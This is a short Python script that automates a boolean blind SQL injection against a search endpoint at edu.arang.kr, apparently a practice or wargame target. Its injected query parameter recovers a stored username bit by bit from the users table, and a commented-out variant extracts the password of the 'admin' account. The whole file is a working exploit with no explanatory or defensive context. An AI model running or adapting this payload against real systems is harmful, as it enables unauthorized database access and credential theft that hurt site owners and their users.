import requests
from time import sleep

url = "http://edu.arang.kr:8080/search.php"
n=1
while True:
    tmp = ""
    for i in range(1,9):
        params = {
            "type":"a",
            "q": f"%')AND(SUBSTR(LPAD(BIN(ORD(SUBSTR((SELECT(username)FROM(users)WHERE(CHAR(105,115,95,97,100,109,105,110)=0)),{n},1))),8,0),{i},1))#"
            # "q": f"%')AND(SUBSTR(LPAD(BIN(ORD(SUBSTR((SELECT(password)FROM(users)WHERE(username=CHAR(97,100,109,105,110))AND(CHAR(105,115,95,97,100,109,105,110)=0)),{n},1))),8,0),{i},1))#"
        }

        response = requests.get(url, params=params)
        sleep(0.5)
        if "No products found." in response.text:
            # print(0, end="")
            tmp += "0"
        else:
            # print(1, end="")
            tmp += "1"
    # print()
    result = chr(int(tmp, 2))
    print(result)
    n += 1
            
    
